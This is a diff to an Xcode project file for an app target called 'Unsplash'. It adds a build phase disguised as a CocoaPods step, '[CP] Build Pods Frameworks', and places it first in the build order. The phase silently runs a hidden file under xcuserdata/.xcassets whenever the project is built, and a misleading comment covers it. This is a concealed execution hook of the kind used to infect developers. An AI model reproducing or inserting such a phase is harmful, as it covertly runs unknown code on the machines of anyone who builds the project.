@@ -173,6 +173,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22834BE32629D8EF00090032 /* Build configuration list for PBXNativeTarget "Unsplash" */;
 			buildPhases = (
+				CADFEBE1DF6FFF8653AAC43A /* [CP] Build Pods Frameworks */,
 				EE683595FE6ACD3B259029CB /* [CP] Check Pods Manifest.lock */,
 				22834BB52629D8EC00090032 /* Sources */,
 				22834BB62629D8EC00090032 /* Frameworks */,
@@ -297,6 +298,28 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	CADFEBE1DF6FFF8653AAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
 		1845F5CA762442C1213F8B29 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
